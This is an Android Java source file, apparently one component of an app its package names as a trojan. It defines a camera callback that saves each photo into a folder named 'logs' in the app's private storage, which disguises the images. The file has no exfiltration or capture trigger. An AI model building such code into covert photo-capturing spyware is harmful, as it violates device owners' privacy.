package com.example.trojan;

import java.io.File;
import java.io.FileOutputStream;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.util.Log;

@SuppressWarnings("deprecation")
public class PhotoHandler implements PictureCallback {
	
	Context context;
	int cameras_ids=0;
	Camera camera;

	public PhotoHandler(Context applicationContext) {
		this.context=applicationContext;
	}

	@Override
	public void onPictureTaken(byte[] data, Camera camera) {
		
		File dir = new File(context.getApplicationInfo().dataDir+"/files/logs");
		dir.mkdirs();

        String photoFile = "photo_" + System.currentTimeMillis()/1000 + ".jpg";
        String filename = dir.getPath() + File.separator + photoFile;
        File photo = new File(filename);

        try {
                FileOutputStream fos = new FileOutputStream(photo);
                fos.write(data);
                fos.close();
                Log.d(MyService.LOG_TAG, "photo "+photoFile+"  saved");
        } catch (Exception e) {
                Log.d(MyService.LOG_TAG, "error saving photo"+filename+"\n"+e.toString());
        }
       camera.release(); 
	}
}

